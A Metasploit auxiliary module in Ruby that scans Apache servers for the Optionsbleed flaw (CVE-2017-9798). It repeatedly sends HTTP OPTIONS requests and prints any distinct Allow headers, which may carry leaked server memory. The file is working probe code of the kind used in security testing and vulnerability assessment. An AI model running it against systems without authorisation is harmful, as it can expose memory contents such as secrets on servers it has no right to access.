##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache Optionsbleed Scanner',
      'Description' => %q{
        This module scans for the Apache optionsbleed vulnerability where the Allow
        response header returned from an OPTIONS request may bleed memory if the
        server has a .htaccess file with an invalid Limit method defined.
      },
      'Author' => [
        'Hanno Bock', # Vulnerability discovery
        'h00die', # Metasploit module
      ],
      'References' => [
        [ 'AKA', 'Optionsbleed' ],
        [ 'CVE', '2017-9798' ],
        [ 'EDB', '42745' ],
        [ 'URL', 'https://github.com/hannob/optionsbleed' ],
        [ 'URL', 'https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html' ]
      ],
      'DisclosureDate' => 'Sep 18 2017',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptInt.new('REPEAT', [true, 'Times to attempt', 40])
    ])
  end

  def get_allow_header(ip)
    res = send_request_raw({
      'version' => '1.1',
      'method'  => 'OPTIONS',
      'uri'     => '/'
    }, 10)
    if res
      if res.headers['Allow']
        return res.headers['Allow']
      else #now allow header returned
        fail_with(Failure::UnexpectedReply, "#{rhost}:#{rport} - No Allow header identified")
      end
    else
      fail_with(Failure::Unreachable, "#{rhost}:#{rport} - Failed to respond")
    end
  end

  def run_host(ip)
    uniques = []
    for counter in 1..datastore['REPEAT']
      allows = get_allow_header(ip)
      vprint_status("#{counter}: #{allows}")
      if !uniques.include?(allows)
        uniques << allows
        print_good("New Unique Response on Request #{counter}: #{allows}")
      end
    end
    if uniques.length > 1
      print_good('More than one Accept header received.  Most likely vulnerable')
      uniques.each do |allow|
        print_good("#{allow}")
      end
    end
  end

end
